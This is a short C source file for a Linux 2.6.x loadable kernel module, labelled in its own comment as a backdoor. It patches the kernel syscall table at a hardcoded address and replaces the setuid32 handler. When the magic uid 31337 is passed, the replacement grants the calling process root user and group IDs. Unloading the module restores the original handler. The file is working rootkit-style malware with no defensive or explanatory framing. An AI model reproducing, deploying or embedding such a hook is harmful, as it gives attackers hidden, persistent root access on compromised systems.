/* Module backdoor for Linux 2.6.x */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>

MODULE_LICENSE ("GPL");

unsigned long *sys_call_table;
int (*orig_setuid)(uid_t);

int change_setuid(uid_t uid)
{
  if (uid == 31337)
  {
    current->uid = 0;
    current->euid = 0;
    current->gid = 0;
    current->egid = 0;
    return 0;
  }
  return (*orig_setuid)(uid);
}

int init_module(void)
{
  *(long *)&sys_call_table = 0xc03ce760;
  orig_setuid = (void *)xchg(&sys_call_table[__NR_setuid32], change_setuid);

  return 0;
}

void cleanup_module(void)
{
  xchg(&sys_call_table[__NR_setuid32], orig_setuid);
}
